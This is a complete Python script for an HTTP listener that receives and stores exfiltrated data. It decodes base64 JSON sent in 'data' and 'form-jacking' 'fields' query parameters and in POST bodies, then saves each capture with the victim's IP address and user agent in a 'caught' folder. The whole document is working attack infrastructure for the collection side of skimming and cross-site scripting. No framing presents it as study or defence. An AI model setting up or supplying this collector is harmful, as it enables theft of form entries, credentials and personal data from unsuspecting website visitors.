#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
import json
import base64
import os
from datetime import datetime

class PrettyJSONListener(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

        # Ensure folder exists
        os.makedirs("caught", exist_ok=True)

        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "unknown")
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"caught/{now}_{ip.replace(':', '-')}_HIT.json"

        payload = {
            "captured_at": datetime.now().isoformat(),
            "source_ip": ip,
            "user_agent": ua,
            "request_path": self.path,
            "method": "GET",
            "decoded_data": None,
            "raw_base64": None,
            "error": None
        }

        # ———————— Handle ?data=... (main payload) ————————
        if "data=" in self.path:
            try:
                encoded = self.path.split("data=", 1)[1].split("&")[0]
                # Fix padding
                encoded += "=" * (-len(encoded) % 4)
                # url-safe → normal base64
                encoded = encoded.replace("-", "+").replace("_", "/")
                raw_json = base64.b64decode(encoded).decode("utf-8")
                parsed = json.loads(raw_json)

                payload["decoded_data"] = parsed
                payload["raw_base64"] = encoded.rstrip("=")

            except Exception as e:
                payload["error"] = str(e)
                payload["raw_base64"] = self.path

        # ———————— Handle form-jacking ?fields=... ————————
        elif "fields=" in self.path:
            try:
                encoded = self.path.split("fields=", 1)[1].split("&")[0]
                encoded += "=" * (-len(encoded) % 4)
                encoded = encoded.replace("-", "+").replace("_", "/")
                raw_json = base64.b64decode(encoded).decode("utf-8")
                parsed = json.loads(raw_json)

                payload["decoded_data"] = {"formjack": parsed}
                payload["raw_base64"] = encoded.rstrip("=")

            except Exception as e:
                payload["error"] = str(e)

        # ———————— Save as pretty, readable JSON ————————
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)

        print(f"[+] Saved → {filename}")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b""

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

        os.makedirs("caught", exist_ok=True)
        ip = self.client_address[0]
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"caught/{now}_{ip.replace(':', '-')}_POST.json"

        payload = {
            "captured_at": datetime.now().isoformat(),
            "source_ip": ip,
            "user_agent": self.headers.get("User-Agent", "unknown"),
            "method": "POST",
            "content_length": length
        }

        if body:
            try:
                text = body.decode("utf-8")
                parsed = json.loads(text)
                payload["decoded_json"] = parsed
            except:
                payload["raw_base64"] = base64.b64encode(body).decode()
                payload["raw_text"] = body.decode("utf-8", errors="replace")

            with open(filename, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=2, ensure_ascii=False)
            print(f"[+] POST saved → {filename}")
        else:
            print(f"[i] Empty POST from {ip}")

# —————————————— Start server ——————————————
if __name__ == "__main__":
    PORT = 11111
    print(f"""
    Pretty JSON Listener Running
    → http://0.0.0.0:{PORT}
    → All data saved as beautiful JSON in ./caught/
    """)
    HTTPServer(("0.0.0.0", PORT), PrettyJSONListener).serve_forever()